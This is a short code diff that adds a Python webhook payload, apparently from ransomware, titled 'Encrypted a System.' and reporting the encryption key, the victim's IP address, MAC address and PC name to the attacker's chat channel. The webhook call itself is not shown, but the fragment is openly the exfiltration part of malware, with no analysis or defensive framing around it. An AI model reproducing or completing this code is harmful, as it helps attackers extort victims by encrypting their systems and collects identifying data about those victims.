@@ -1,0 +1,22 @@
+webhook_data = {"username": "BotName", "embeds": [
+    dict(title="Encrypted a System.",
+         color=f'{random.randint(0, 0xFFFFFF)}',
+         fields=[
+             {
+                 "name": "**E/D Key**",
+                 "value": f'||{key}||',
+                 "inline": True
+             },
+             {
+                 "name": "**IP Address**",
+                 "value": f'`{ip.text}`',
+                 "inline": True
+             },
+             {
+                 "name": "**PC info**",
+                 "value": f"mac: `{mac}` \nPC name: `{gethostname()}`",
+                 "inline": True
+
+             },
+         ]),
+]}
